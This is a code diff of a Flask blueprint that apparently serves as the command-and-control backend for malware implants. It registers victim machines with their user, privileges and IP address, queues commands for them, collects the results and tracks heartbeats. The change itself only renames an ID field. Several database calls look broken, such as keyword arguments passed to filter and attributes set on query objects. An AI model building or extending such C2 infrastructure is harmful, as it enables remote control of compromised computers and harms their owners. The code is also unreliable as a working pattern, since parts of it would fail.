@@ -21,12 +21,12 @@ bp = Blueprint('implant', __name__)
 def register():
     try:
         if request.method == 'POST':
-            imp_id = request.json['implant_id']
+            imp_id = request.json['computer_guid']
             now = datetime.now()
             current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
             cmp_name = request.json['computer_name']
             user_name = request.json['computer_user']
-            implant_id = request.json['computer_GUID']
+            computer_guid = request.json['computer_guid']
             cmp_prev = request.json['computer_privileges']
             ip = request.json['connecting_ip_address']
             #session_key = request.json["session_key"]
@@ -40,7 +40,7 @@ def register():
 
             if error is None:
                 try:
-                    implant = Implant.query.filter(computer_GUID=imp_id)
+                    implant = Implant.query.filter(computer_guid=imp_id)
                     if implant:
                         implant.computer_name = cmp_name
                         implant.computer_user = user_name
@@ -55,7 +55,7 @@ def register():
                         implant = Implant(
                             computer_name=cmp_name,
                             computer_user=user_name,
-                            computer_GUID=implant_id,
+                            computer_guid=computer_guid,
                             computer_privileges=cmp_prev,
                             connecting_ip_address=ip,
                             # session_key=session_key,
@@ -81,11 +81,11 @@ def register():
 def get_next_command():
     if request.method == 'POST':
         try:
-            impl_id = request.json["implant_id"]
+            impl_id = request.json["computer_guid"]
 
             if impl_id:
                 commands = Command.query.filter(
-                    computer_GUID=impl_id, status="not_taken_by_implant")
+                    computer_guid=impl_id, status="not_taken_by_implant")
                 if commands:
                     first_value = commands.first()
                     command = first_value.command_text
@@ -106,12 +106,12 @@ def get_next_command():
 def store_command_results():
     if request.method == 'POST':
         try:
-            impl_id = request.json["implant_id"]
+            impl_id = request.json["computer_guid"]
             cmd_id = request.json["command_id"]
             result = request.json["result"]
 
             if impl_id:
-                commands = Command.query.filter(computer_GUID=impl_id, status="taken_by_implant",
+                commands = Command.query.filter(computer_guid=impl_id, status="taken_by_implant",
                                                 command_id=cmd_id)
                 if commands:
                     commands.command_result = result
@@ -128,9 +128,9 @@ def store_command_results():
 def heartbeat():
     if request.method == 'POST':
         try:
-            imp_id = request.json['implant_id']
+            imp_id = request.json['computer_guid']
             try:
-                implant = Implant.query.filter(computer_GUID=imp_id)
+                implant = Implant.query.filter(computer_guid=imp_id)
                 now = datetime.now()
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                 implant.last_seen = current_date_time
@@ -145,12 +145,12 @@ def heartbeat():
 def alert():
     if request.method == 'POST':
         try:
-            imp_id = request.json['implant_id']
+            imp_id = request.json['computer_guid']
             alert = request.json['alert']
             try:
                 now = datetime.now()
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
-                alert = Alert(computer_GUID=imp_id,
+                alert = Alert(computer_guid=imp_id,
                               time_reported=current_date_time, alert=alert)
                 return jsonify({"status": "Alert Registered"})
             except:
